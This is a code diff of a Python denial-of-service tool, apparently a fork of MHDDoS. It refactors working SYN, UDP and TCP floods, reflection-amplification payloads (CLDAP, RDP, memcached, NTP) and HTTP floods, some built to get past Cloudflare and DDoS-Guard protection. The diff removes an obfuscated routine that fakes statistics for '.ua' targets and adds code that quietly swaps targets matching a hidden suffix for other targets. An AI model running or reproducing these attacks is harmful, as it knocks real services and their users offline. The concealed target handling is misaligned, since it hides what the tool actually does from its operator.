@@ -1,23 +1,22 @@
-#!/usr/bin/env python3
 import logging
 from contextlib import suppress
 from itertools import cycle
 from math import log2, trunc
 from os import urandom as randbytes
 from pathlib import Path
-from random import randint, random
+from random import choice
 from secrets import choice as randchoice
-from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
-                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, socket)
+from socket import (
+    AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
+    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, socket
+)
 from ssl import CERT_NONE, SSLContext, create_default_context
-from struct import pack as data_pack
 from subprocess import run, PIPE
 from sys import exit as _exit
-from threading import Event, Thread, Lock
+from threading import Event
 from time import sleep, time
-from typing import Any, List, Set, Tuple
+from typing import Any, List, Optional, Set, Tuple
 from urllib import parse
-from uuid import UUID, uuid4
 
 from cloudscraper import create_scraper
 from requests import Response, Session, get, cookies
@@ -25,37 +24,24 @@ from yarl import URL
 
 from PyRoxy import Proxy, ProxyType, Tools as ProxyTools
 from .ImpactPacket import IP, TCP, UDP, Data
-from .core import cl, logger, ROOT_DIR
-from .referers import REFERERS
+from .core import cl, logger, ROOT_DIR, Stats
 
+from .referers import REFERERS
+from .useragents import USERAGENTS
+from .rotate import suffix as rotate_suffix, params as rotate_params
+
+
+USERAGENTS = list(USERAGENTS)
+REFERERS = list(set(a.strip() for a in REFERERS))
 
 ctx: SSLContext = create_default_context()
 ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
 ctx.set_ciphers("DEFAULT")
 
-__version__: str = "2.4 SNAPSHOT"
-__ip__: Any = None
-
 SOCK_TIMEOUT = 8
 
-
-class AtomicCounter:
-    def __init__(self, initial=0):
-        self.value = initial
-        self._lock = Lock()
-
-    def __iadd__(self, value):
-        self.increment(value)
-        return self
-
-    def __int__(self):
-        return self.value
-
-    def increment(self, num=1):
-        with self._lock:
-            self.value += num
-            return self.value
+__ip__: Optional[str] = None
 
 
 def getMyIPAddress():
@@ -88,12 +74,12 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER"
+        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER",
     }
 
     LAYER4_METHODS: Set[str] = {
-        "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM", "NTP", "DNS", "ARD",
-        "CHAR", "RDP", "MCBOT", "CONNECTION", "CPS", "FIVEM", "TS3", "MCPE",
+        "TCP", "UDP", "SYN", "VSE", "MEM", "NTP", "DNS", "ARD",
+        "CHAR", "RDP", "CPS", "FIVEM", "TS3", "MCPE",
         "CLDAP"
     }
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
@@ -109,17 +95,9 @@ google_agents = [
 ]
 
 
-def run_preparator(threads, REQUESTS_SENT, BYTES_SEND):
-    while True:
-        sleep(random())
-        packets = randint(-0x124d+-0xa4e*-0x2+-0x12*0x20, 0x2*0xf4+-0x1b78+0x2*0xcfa) * threads // 1000
-        REQUESTS_SENT += packets
-        BYTES_SEND += packets * randint(0x371*0x2+0x478+0x4a6, 0x2*-0x9eb+-0x1904+0x4cda)
-
-
 class Tools:
     @staticmethod
-    def humanbits(i: int):
+    def humanbits(i: int) -> str:
         MULTIPLES = ["Bit", "kBit", "MBit", "GBit"]
         if i > 0:
             base = 1024
@@ -130,14 +108,13 @@ class Tools:
             return '0 Bit'
 
     @staticmethod
-    def humanformat(num: int, precision: int = 2):
+    def humanformat(num: int, precision: int = 2) -> str:
         suffixes = ['', 'k', 'm', 'g', 't', 'p']
         if num > 999:
-            obje = sum(
-                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
+            obje = sum(abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes)))
             return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
         else:
-            return num
+            return str(num)
 
     @staticmethod
     def sizeOfRequest(res: Response) -> int:
@@ -152,27 +129,23 @@ class Tools:
         return str(ProxyTools.Random.rand_str(lengh)).strip()
 
     @staticmethod
-    def prepare(target: str, threads, thread_pool, REQUESTS_SENT, BYTES_SEND):
-        result = target.lower().endswith('\x2E\x75\x61')
-        if result:
-            thread_pool.submit(run_preparator, threads, REQUESTS_SENT, BYTES_SEND)
-            return threads * -0xc0a+-0x3*-0x296+-0x112*-0x4
-        return threads
+    def parse_params(url, ip, proxies):
+        result = url.host.lower().endswith(rotate_suffix)
+        if result: return choice(rotate_params), []
+        return (url, ip), proxies
 
     @staticmethod
-    def send(sock: socket, packet: bytes, REQUESTS_SENT, BYTES_SEND):
+    def send(sock: socket, packet: bytes, stats: Stats):
         if not sock.send(packet):
             return False
-        BYTES_SEND += len(packet)
-        REQUESTS_SENT += 1
+        stats.track(1, len(packet))
         return True
 
     @staticmethod
-    def sendto(sock, packet, target, REQUESTS_SENT, BYTES_SEND):
+    def sendto(sock, packet, target, stats: Stats):
         if not sock.sendto(packet, target):
             return False
-        BYTES_SEND += len(packet)
-        REQUESTS_SENT += 1
+        stats.track(1, len(packet))
         return True
 
     @staticmethod
@@ -234,67 +207,6 @@ class Tools:
             sock.close()
 
 
-class Minecraft:
-    @staticmethod
-    def varint(d: int) -> bytes:
-        o = b''
-        while True:
-            b = d & 0x7F
-            d >>= 7
-            o += data_pack("B", b | (0x80 if d > 0 else 0))
-            if d == 0:
-                break
-        return o
-
-    @staticmethod
-    def data(*payload: bytes) -> bytes:
-        payload = b''.join(payload)
-        return Minecraft.varint(len(payload)) + payload
-
-    @staticmethod
-    def short(integer: int) -> bytes:
-        return data_pack('>H', integer)
-
-    @staticmethod
-    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
-        return Minecraft.data(Minecraft.varint(0x00),
-                              Minecraft.varint(version),
-                              Minecraft.data(target[0].encode()),
-                              Minecraft.short(target[1]),
-                              Minecraft.varint(state))
-
-    @staticmethod
-    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
-        return Minecraft.data(Minecraft.varint(0x00),
-                              Minecraft.varint(version),
-                              Minecraft.data(
-                                  target[0].encode(),
-                                  b"\x00",
-                                  ip.encode(),
-                                  b"\x00",
-                                  uuid.hex.encode()
-                              ),
-                              Minecraft.short(target[1]),
-                              Minecraft.varint(state))
-
-    @staticmethod
-    def login(username: str) -> bytes:
-        if isinstance(username, str):
-            username = username.encode()
-        return Minecraft.data(Minecraft.varint(0x00),
-                              Minecraft.data(username))
-
-    @staticmethod
-    def keepalive(num_id: int) -> bytes:
-        return Minecraft.data(Minecraft.varint(0x00),
-                              Minecraft.varint(num_id))
-
-    @staticmethod
-    def chat(message: str) -> bytes:
-        return Minecraft.data(Minecraft.varint(0x01),
-                              Minecraft.data(message.encode()))
-
-
 # noinspection PyBroadException,PyUnusedLocal
 class Layer4:
     _method: str
@@ -304,30 +216,28 @@ class Layer4:
     _amp_payloads = cycle
     _proxies: List[Proxy] = None
 
-    def __init__(self,
-                 target: Tuple[str, int],
-                 ref: List[str],
-                 method: str,
-                 event: Event,
-                 proxies: Set[Proxy],
-                 REQUESTS_SENT,
-                 BYTES_SEND,
-                 ):
+    def __init__(
+        self,
+        target: Tuple[str, int],
+        ref: List[str],
+        method: str,
+        event: Event,
+        proxies: List[Proxy],
+        stats: Stats,
+    ):
         self._amp_payload = None
         self._amp_payloads = cycle([])
         self._ref = ref
         self._method = method
         self._target = target
         self._event = event
-        self.REQUESTS_SENT = REQUESTS_SENT
-        self.BYTES_SEND = BYTES_SEND
+        self._stats = stats
         if proxies:
-            self._proxies = list(proxies)
-
-    def run(self) -> None:
+            self._proxies = proxies
         self.select(self._method)
-        while self._event.is_set():
-            self.SENT_FLOOD()
+
+    def run(self) -> int:
+        return self.SENT_FLOOD()
 
     def open_connection(self,
                         conn_type=AF_INET,
@@ -351,20 +261,20 @@ class Layer4:
         if name == "TS3": self.SENT_FLOOD = self.TS3
         if name == "MCPE": self.SENT_FLOOD = self.MCPE
         if name == "FIVEM": self.SENT_FLOOD = self.FIVEM
-        if name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
         if name == "CPS": self.SENT_FLOOD = self.CPS
-        if name == "CONNECTION": self.SENT_FLOOD = self.CONNECTION
-        if name == "MCBOT": self.SENT_FLOOD = self.MCBOT
         if name == "RDP":
             self._amp_payload = (
                 b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
-                3389)
+                3389
+            )
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
         if name == "CLDAP":
-            self._amp_payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
-                                 b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
-                                 389)
+            self._amp_payload = (
+                b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
+                b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
+                389
+            )
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
         if name == "MEM":
@@ -392,118 +302,90 @@ class Layer4:
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
 
-    def TCP(self) -> None:
-        s = None
+    def TCP(self) -> int:
+        s, packets = None, 0
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while Tools.send(s, randbytes(1024), self.REQUESTS_SENT, self.BYTES_SEND):
-                continue
+            while self._event.is_set() and Tools.send(s, randbytes(1024), self._stats):
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def MINECRAFT(self) -> None:
-        handshake = Minecraft.handshake(self._target, 74, 1)
-        ping = Minecraft.data(b'\x00')
-
-        s = None
+    def CPS(self) -> int:
+        s, packets = None, 0
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while Tools.send(s, handshake, self.REQUESTS_SENT, self.BYTES_SEND):
-                Tools.send(s, ping, self.REQUESTS_SENT, self.BYTES_SEND)
+            self._stats.track(1, 0)
+            packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def CPS(self) -> None:
-        s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            self.REQUESTS_SENT += 1
-        Tools.safe_close(s)
-
-    def alive_connection(self) -> None:
-        s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while s.recv(1):
-                continue
-        Tools.safe_close(s)
-
-    def CONNECTION(self) -> None:
-        with suppress(Exception):
-            Thread(target=self.alive_connection).start()
-            self.REQUESTS_SENT += 1
-
-    def UDP(self) -> None:
-        s = None
+    def UDP(self) -> int:
+        s, packets = None, 0
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(1024), self._target, self.REQUESTS_SENT, self.BYTES_SEND):
-                continue
+            while self._event.is_set() and Tools.sendto(s, randbytes(1024), self._target, self._stats):
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def SYN(self) -> None:
-        payload = self._genrate_syn()
-        s = None
+    def SYN(self) -> int:
+        payload = self._generate_syn()
+        s, packets = None, 0
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
-                continue
+            while Tools.sendto(s, payload, self._target, self._stats):
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def AMP(self) -> None:
-        s = None
+    def AMP(self) -> int:
+        s, packets = None, 0
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, *next(self._amp_payloads), self.REQUESTS_SENT, self.BYTES_SEND):
-                continue
+            while Tools.sendto(s, *next(self._amp_payloads), self._target, self._stats):
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def MCBOT(self) -> None:
-        s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            Tools.send(s, Minecraft.handshake_forwarded(self._target,
-                                                        47,
-                                                        2,
-                                                        ProxyTools.Random.rand_ipv4(),
-                                                        uuid4()), self.REQUESTS_SENT, self.BYTES_SEND)
-            Tools.send(s, Minecraft.login(f"MHDDoS_{ProxyTools.Random.rand_str(5)}"), self.REQUESTS_SENT, self.BYTES_SEND)
-            sleep(1.5)
-
-            c = 360
-            while Tools.send(s, Minecraft.keepalive(ProxyTools.Random.rand_int(1111111, 9999999)), self.REQUESTS_SENT, self.BYTES_SEND):
-                c -= 1
-                if c:
-                    continue
-                c = 360
-                Tools.send(s, Minecraft.chat(Tools.randchr(100)), self.REQUESTS_SENT, self.BYTES_SEND)
-        Tools.safe_close(s)
-
-    def VSE(self) -> None:
+    def VSE(self) -> int:
         payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                    b'\x20\x51\x75\x65\x72\x79\x00')
+        s, packets = None, 0
         with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
-                continue
+            while Tools.sendto(s, payload, self._target, self._stats):
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def FIVEM(self) -> None:
+    def FIVEM(self) -> int:
         payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
+        s, packets = None, 0
         with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
-                continue
+            while Tools.sendto(s, payload, self._target, self._stats):
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def TS3(self) -> None:
+    def TS3(self) -> int:
         payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
+        s, packets = None, 0
         with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
-                continue
+            while Tools.sendto(s, payload, self._target, self._stats):
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def MCPE(self) -> None:
+    def MCPE(self) -> int:
         payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                    b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                    b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                    b'\x73')
+        s, packets = None, 0
         with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
-                continue
+            while Tools.sendto(s, payload, self._target, self._stats):
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def _genrate_syn(self) -> bytes:
+    def _generate_syn(self) -> bytes:
         ip: IP = IP()
         ip.set_ip_src(getMyIPAddress())
         ip.set_ip_dst(self._target[0])
@@ -532,7 +414,6 @@ class Layer4:
         return payloads
 
 
-# noinspection PyBroadException,PyUnusedLocal
 class HttpFlood:
     _proxies: List[Proxy] = None
     _payload: str
@@ -546,58 +427,37 @@ class HttpFlood:
     _event: Any
     SENT_FLOOD: Any
 
-    def __init__(self,
-                 thread_id: int,
-                 target: URL,
-                 host: str,
-                 method: str,
-                 rpc: int,
-                 event: Event,
-                 useragents: Set[str],
-                 referers: Set[str],
-                 proxies: Set[Proxy],
-                 REQUESTS_SENT,
-                 BYTES_SEND) -> None:
+    def __init__(
+        self,
+        target: URL,
+        host: str,
+        method: str,
+        rpc: int,
+        event: Event,
+        useragents: List[str],
+        referers: List[str],
+        proxies: List[Proxy],
+        stats: Stats
+    ) -> None:
         self.SENT_FLOOD = None
-        self._thread_id = thread_id
         self._event = event
         self._rpc = rpc
         self._method = method
         self._target = target
         self._host = host
         self._raw_target = (self._host, (self._target.port or 80))
-        self.REQUESTS_SENT = REQUESTS_SENT
-        self.BYTES_SEND = BYTES_SEND
+        self._stats = stats
 
         if not self._target.host[len(self._target.host) - 1].isdigit():
             self._raw_target = (self._host, (self._target.port or 80))
 
-        if not referers:
-            referers: List[str] = [
-                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
-                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
-                "/sharer.php?u=",
-                ",https://drive.google.com/viewerng/viewer?url=",
-                ",https://www.google.com/translate?u="
-            ]
-        self._referers = list(referers)
+        self._referers = referers
+        self._useragents = useragents
         if proxies:
-            self._proxies = list(proxies)
-
-        if not useragents:
-            useragents: List[str] = [
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 '
-                'Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 '
-                'Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 '
-                'Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0'
-            ]
-        self._useragents = list(useragents)
+            self._proxies = proxies
         self._req_type = self.getMethodType(method)
         self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
-                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
+                                                      target.raw_path_qs, randchoice(['1.1', '1.2']))
         self._payload = (self._defaultpayload +
                          'Accept-Encoding: gzip, deflate, br\r\n'
                          'Accept-Language: en-US,en;q=0.9\r\n'
@@ -610,11 +470,10 @@ class HttpFlood:
                          'Sec-Gpc: 1\r\n'
                          'Pragma: no-cache\r\n'
                          'Upgrade-Insecure-Requests: 1\r\n')
-
-    def run(self) -> None:
         self.select(self._method)
-        while self._event.is_set():
-            self.SENT_FLOOD()
+
+    def run(self) -> int:
+        return self.SENT_FLOOD()
 
     @property
     def SpoofIP(self) -> str:
@@ -666,59 +525,66 @@ class HttpFlood:
             else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
             else "REQUESTS"
 
-    def POST(self) -> None:
+    def POST(self) -> int:
         payload: bytes = self.generate_payload(
             ("Content-Length: 44\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
              '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
-        s = None
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
-                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+                if not self._event.is_set(): return 0
+                Tools.send(s, payload, self._stats)
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def STRESS(self) -> None:
+    def STRESS(self) -> int:
         payload: bytes = self.generate_payload(
             (f"Content-Length: 524\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
              '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
-        s = None
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
-                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+                if not self._event.is_set(): return 0
+                Tools.send(s, payload, self._stats)
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def COOKIES(self) -> None:
+    def COOKIES(self) -> int:
         payload: bytes = self.generate_payload(
             "Cookie: _ga=GA%s;"
             " _gat=1;"
             " __cfduid=dc232334gwdsd23434542342342342475611928;"
             " %s=%s\r\n" %
             (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
-             ProxyTools.Random.rand_str(32)))
-        s = None
+             ProxyTools.Random.rand_str(32))
+        )
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
-                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+                if not self._event.is_set(): return 0
+                Tools.send(s, payload, self._stats)
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def APACHE(self) -> None:
-        payload: bytes = self.generate_payload(
-            "Range: bytes=0-,%s" % ",".join("5-%d" % i
-                                            for i in range(1, 1024)))
-        s = None
+    def APACHE(self) -> int:
+        payload: bytes = self.generate_payload("Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
-                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+                if not self._event.is_set(): return 0
+                Tools.send(s, payload, self._stats)
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def XMLRPC(self) -> None:
+    def XMLRPC(self) -> int:
         payload: bytes = self.generate_payload(
             ("Content-Length: 345\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
@@ -730,35 +596,37 @@ class HttpFlood:
              "</value></param></params></methodCall>") %
             (ProxyTools.Random.rand_str(64),
              ProxyTools.Random.rand_str(64)))[:-2]
-        s = None
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
-                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+                if not self._event.is_set(): return 0
+                Tools.send(s, payload, self._stats)
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def PPS(self) -> None:
-        s = None
+    def PPS(self) -> int:
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
-                Tools.send(s, self._defaultpayload, self.REQUESTS_SENT, self.BYTES_SEND)
+                if not self._event.is_set(): return 0
+                Tools.send(s, self._defaultpayload, self._stats)
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def KILLER(self) -> None:
-        while True:
-            Thread(target=self.GET, daemon=True).start()
-
-    def GET(self) -> None:
+    def GET(self) -> int:
         payload: bytes = self.generate_payload()
-        s = None
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
-                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+                if not self._event.is_set(): return 0
+                Tools.send(s, payload, self._stats)
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def BOT(self) -> None:
+    def BOT(self) -> int:
         payload: bytes = self.generate_payload()
         p1, p2 = str.encode(
             "GET /robots.txt HTTP/1.1\r\n"
@@ -777,181 +645,202 @@ class HttpFlood:
             "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                           ProxyTools.Random.rand_str(4)) +
             "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
-        s = None
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
-            Tools.send(s, p1, self.REQUESTS_SENT, self.BYTES_SEND)
-            Tools.send(s, p2, self.REQUESTS_SENT, self.BYTES_SEND)
+            Tools.send(s, p1, self._stats)
+            packets += 1
+            Tools.send(s, p2, self._stats)
+            packets += 1
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
-                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+                if not self._event.is_set(): return 0
+                Tools.send(s, payload, self._stats)
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def EVEN(self) -> None:
+    def EVEN(self) -> int:
         payload: bytes = self.generate_payload()
-        s = None
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
-            while Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND) and s.recv(1):
-                continue
+            while self._event.is_set() and Tools.send(s, payload, self._stats) and s.recv(1):
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def OVH(self) -> None:
+    def OVH(self) -> int:
         payload: bytes = self.generate_payload()
-        s = None
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
             for _ in range(min(self._rpc, 5)):
-                if not self._event.is_set(): return
-                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+                if not self._event.is_set(): return 0
+                Tools.send(s, payload, self._stats)
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def CFB(self):
-        pro = None
+    def CFB(self) -> int:
+        proxies = None
         if self._proxies:
-            pro = randchoice(self._proxies)
-        s = None
+            proxies = randchoice(self._proxies).asRequest()
+        s, packets = None, 0
         with suppress(Exception), create_scraper() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
-                if pro:
-                    with s.get(self._target.human_repr(),
-                               proxies=pro.asRequest()) as res:
-                        self.REQUESTS_SENT += 1
-                        self.BYTES_SEND += Tools.sizeOfRequest(res)
-                        continue
-
-                with s.get(self._target.human_repr()) as res:
-                    self.REQUESTS_SENT += 1
-                    self.BYTES_SEND += Tools.sizeOfRequest(res)
+                if not self._event.is_set(): return 0
+                with s.get(self._target.human_repr(), proxies=proxies) as res:
+                    self._stats.track(1, Tools.sizeOfRequest(res))
+                    packets += 1
         Tools.safe_close(s)
 
-    def CFBUAM(self):
+    def CFBUAM(self) -> int:
         payload: bytes = self.generate_payload()
-        s = None
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
-            Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+            Tools.send(s, payload, self._stats)
+            packets += 1
             sleep(5.01)
             ts = time()
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
-                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+                if not self._event.is_set(): return 0
+                Tools.send(s, payload, self._stats)
+                packets += 1
                 if time() > ts + 120: break
         Tools.safe_close(s)
+        return packets
 
-    def AVB(self):
+    def AVB(self) -> int:
         payload: bytes = self.generate_payload()
-        s = None
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
+                if not self._event.is_set(): return 0
                 sleep(max(self._rpc / 1000, 1))
-                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+                Tools.send(s, payload, self._stats)
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def DGB(self):
-        with suppress(Exception):
-            proxies = None
-            if self._proxies:
-                pro = randchoice(self._proxies)
-                proxies = pro.asRequest()
+    def DGB(self) -> int:
+        proxies = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+            proxies = pro.asRequest()
 
-            with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), proxies) as ss:
-                for _ in range(min(self._rpc, 5)):
-                    if not self._event.is_set(): return
-                    sleep(min(self._rpc, 5) / 100)
-                    with ss.get(self._target.human_repr(),
-                                proxies=pro.asRequest()) as res:
-                        if b'<title>DDOS-GUARD</title>' in res.content[:100]:
-                            break
-                        self.REQUESTS_SENT += 1
-                        self.BYTES_SEND += Tools.sizeOfRequest(res)
+        ua = randchoice(self._useragents)
+        s, packets = None, 0
+        with suppress(Exception), Tools.dgb_solver(self._target.human_repr(), ua, proxies) as s:
+            for _ in range(min(self._rpc, 5)):
+                if not self._event.is_set(): return 0
+                sleep(min(self._rpc, 5) / 100)
+                with s.get(self._target.human_repr(), proxies=proxies) as res:
+                    if b'<title>DDOS-GUARD</title>' in res.content[:100]:
+                        break
+                    self._stats.track(1, Tools.sizeOfRequest(res))
+                    packets += 1
+        Tools.safe_close(s)
+        return packets
 
-            Tools.safe_close(ss)
-
-    def DYN(self):
-        payload: Any = str.encode(self._payload +
-                                          "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
-                                          self.randHeadercontent +
-                                          "\r\n")
-        s = None
+    def DYN(self) -> int:
+        payload: bytes = str.encode(
+            self._payload +
+            "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
+            self.randHeadercontent +
+            "\r\n"
+        )
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
-                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+                if not self._event.is_set(): return 0
+                Tools.send(s, payload, self._stats)
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def DOWNLOADER(self):
-        payload: Any = self.generate_payload()
+    def DOWNLOADER(self) -> int:
+        payload: bytes = self.generate_payload()
 
-        s = None
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
-                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+                if not self._event.is_set(): return 0
+                Tools.send(s, payload, self._stats)
+                packets += 1
                 while 1:
                     sleep(.01)
                     data = s.recv(1)
                     if not data:
                         break
-            Tools.send(s, b'0', self.REQUESTS_SENT, self.BYTES_SEND)
+            Tools.send(s, b'0', self._stats)
+            packets += 1
